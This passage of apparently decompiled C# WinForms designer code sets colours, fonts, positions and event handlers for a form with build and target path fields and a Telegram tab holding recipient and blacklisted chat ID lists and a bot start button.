        ((System.Windows.Forms.Control)this.buildPathLbl).Name = "buildPathLbl";
        ((System.Windows.Forms.Control)this.buildPathLbl).Size = new System.Drawing.Size(64, 15);
        ((System.Windows.Forms.Control)this.buildPathLbl).TabIndex = 133;
        ((System.Windows.Forms.Control)this.buildPathLbl).Text = "Build path:";
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.openTargetBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openTargetBtn).Location = new System.Drawing.Point(743, 25);
        ((System.Windows.Forms.Control)this.openTargetBtn).Name = "openTargetBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openTargetBtn).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.openTargetBtn).TabIndex = 132;
        ((System.Windows.Forms.Control)this.openTargetBtn).Text = "Open";
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.openTargetBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.openTargetBtn).Click += new System.EventHandler(openTargetBtn_Click);
        ((GuiLib.AnimaTextBox)this.targetPathTb).Dark = false;
        ((System.Windows.Forms.Control)this.targetPathTb).Location = new System.Drawing.Point(299, 25);
        ((GuiLib.AnimaTextBox)this.targetPathTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.targetPathTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.targetPathTb).Name = "targetPathTb";
        ((GuiLib.AnimaTextBox)this.targetPathTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.targetPathTb).ReadOnly = true;
        ((System.Windows.Forms.Control)this.targetPathTb).Size = new System.Drawing.Size(438, 23);
        ((System.Windows.Forms.Control)this.targetPathTb).TabIndex = 131;
        ((GuiLib.AnimaTextBox)this.targetPathTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.targetPathLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.targetPathLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.targetPathLbl).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.targetPathLbl).Location = new System.Drawing.Point(299, 7);
        ((System.Windows.Forms.Control)this.targetPathLbl).Name = "targetPathLbl";
        ((System.Windows.Forms.Control)this.targetPathLbl).Size = new System.Drawing.Size(71, 15);
        ((System.Windows.Forms.Control)this.targetPathLbl).TabIndex = 130;
        ((System.Windows.Forms.Control)this.targetPathLbl).Text = "Target path:";
        ((System.Windows.Forms.Control)this.m_b2).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.autoStartTelegramCb);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.label57);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.addIdBlackListBtn);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.removeIdBlackListBtn);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.blackListChatIds);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.label49);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.addRecipientIdBtn);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.configRecipientIdBtn);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.removeRecipientIdBtn);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.recipientsIdsListBox);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.label51);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.m_b3);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.m_b4);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.m_b5);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.m_b6);
        ((System.Windows.Forms.Control)this.m_b2).Controls.Add((System.Windows.Forms.Control)this.b7);
        ((System.Windows.Forms.Control)this.m_b2).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.m_b2).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.m_b2).Name = "telegramPage";
        ((System.Windows.Forms.Control)this.m_b2).Padding = new System.Windows.Forms.Padding(3);
        ((System.Windows.Forms.Control)this.m_b2).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.m_b2).TabIndex = 16;
        ((System.Windows.Forms.Control)this.m_b2).Text = "Telegram";
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).BackColor = System.Drawing.Color.Transparent;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).Checked = false;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).CheckState = MetroSet_UI.Enums.CheckState.Unchecked;
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).Cursor = System.Windows.Forms.Cursors.Hand;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).Location = new System.Drawing.Point(503, 480);
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).Name = "autoStartTelegramCb";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).SignStyle = MetroSet_UI.Enums.SignStyle.Sign;
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).Size = new System.Drawing.Size(19, 16);
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).StyleManager = null;
        ((System.Windows.Forms.Control)this.autoStartTelegramCb).TabIndex = 145;
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetCheckBox)this.autoStartTelegramCb).CheckedChanged += new System.EventHandler(autoStartTelegramCb_CheckedChanged);
        ((System.Windows.Forms.Control)this.label57).AutoSize = true;
        ((System.Windows.Forms.Control)this.label57).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label57).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
        ((System.Windows.Forms.Control)this.label57).Location = new System.Drawing.Point(367, 480);
        ((System.Windows.Forms.Control)this.label57).Name = "label57";
        ((System.Windows.Forms.Control)this.label57).Size = new System.Drawing.Size(60, 15);
        ((System.Windows.Forms.Control)this.label57).TabIndex = 144;
        ((System.Windows.Forms.Control)this.label57).Text = "AutoStart:";
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).Location = new System.Drawing.Point(720, 366);
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).Name = "addIdBlackListBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).TabIndex = 138;
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addIdBlackListBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addIdBlackListBtn).Click += new System.EventHandler(addIdBlackListBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).Location = new System.Drawing.Point(579, 366);
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).Name = "removeIdBlackListBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).TabIndex = 136;
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).Text = "Delete";
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.removeIdBlackListBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.removeIdBlackListBtn).Click += new System.EventHandler(removeIdBlackListBtn_Click);
        ((System.Windows.Forms.Control)this.blackListChatIds).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.blackListChatIds).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.blackListChatIds).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.blackListChatIds).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.blackListChatIds).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.blackListChatIds).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.blackListChatIds).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.blackListChatIds).Location = new System.Drawing.Point(577, 142);
        ((System.Windows.Forms.Control)this.blackListChatIds).Name = "blackListChatIds";
        ((System.Windows.Forms.Control)this.blackListChatIds).Size = new System.Drawing.Size(202, 218);
        ((System.Windows.Forms.Control)this.blackListChatIds).TabIndex = 135;
        ((System.Windows.Forms.Control)this.label49).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label49).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label49).Location = new System.Drawing.Point(577, 109);
        ((System.Windows.Forms.Control)this.label49).Name = "label49";
        ((System.Windows.Forms.Control)this.label49).Size = new System.Drawing.Size(202, 30);
        ((System.Windows.Forms.Control)this.label49).TabIndex = 134;
        ((System.Windows.Forms.Control)this.label49).Text = "BlackList Chat IDs";
        ((System.Windows.Forms.Label)this.label49).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).Location = new System.Drawing.Point(512, 366);
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).Name = "addRecipientIdBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).TabIndex = 133;
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.addRecipientIdBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.addRecipientIdBtn).Click += new System.EventHandler(addRecipientIdBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).Location = new System.Drawing.Point(369, 366);
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).Name = "configRecipientIdBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).TabIndex = 132;
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).Text = "Config";
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.configRecipientIdBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.configRecipientIdBtn).Click += new System.EventHandler(configRecipientIdBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).Location = new System.Drawing.Point(440, 366);
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).Name = "removeRecipientIdBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).TabIndex = 131;
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).Text = "Delete";
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.removeRecipientIdBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.removeRecipientIdBtn).Click += new System.EventHandler(removeRecipientIdBtn_Click);
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.recipientsIdsListBox).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.recipientsIdsListBox).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.recipientsIdsListBox).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).Location = new System.Drawing.Point(369, 142);
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).Name = "recipientsIdsListBox";
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).Size = new System.Drawing.Size(202, 218);
        ((System.Windows.Forms.Control)this.recipientsIdsListBox).TabIndex = 128;
        ((System.Windows.Forms.Control)this.label51).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label51).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label51).Location = new System.Drawing.Point(369, 109);
        ((System.Windows.Forms.Control)this.label51).Name = "label51";
        ((System.Windows.Forms.Control)this.label51).Size = new System.Drawing.Size(202, 30);
        ((System.Windows.Forms.Control)this.label51).TabIndex = 127;
        ((System.Windows.Forms.Control)this.label51).Text = "Recipient IDs";
        ((System.Windows.Forms.Label)this.label51).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.m_b3).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.m_b3).Location = new System.Drawing.Point(704, 415);
        ((System.Windows.Forms.Control)this.m_b3).Name = "telegramBotStartBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.m_b3).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).StyleManager = null;
        ((System.Windows.Forms.Control)this.m_b3).TabIndex = 120;
        ((System.Windows.Forms.Control)this.m_b3).Text = "Start";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.m_b3).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.m_b3).Click += new System.EventHandler(b3_Click);
        ((System.Windows.Forms.Control)this.m_b4).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.m_b4).Location = new System.Drawing.Point(458, 441);
        ((System.Windows.Forms.Control)this.m_b4).Name = "telegramBotStatus";
        ((System.Windows.Forms.Control)this.m_b4).Size = new System.Drawing.Size(114, 25);
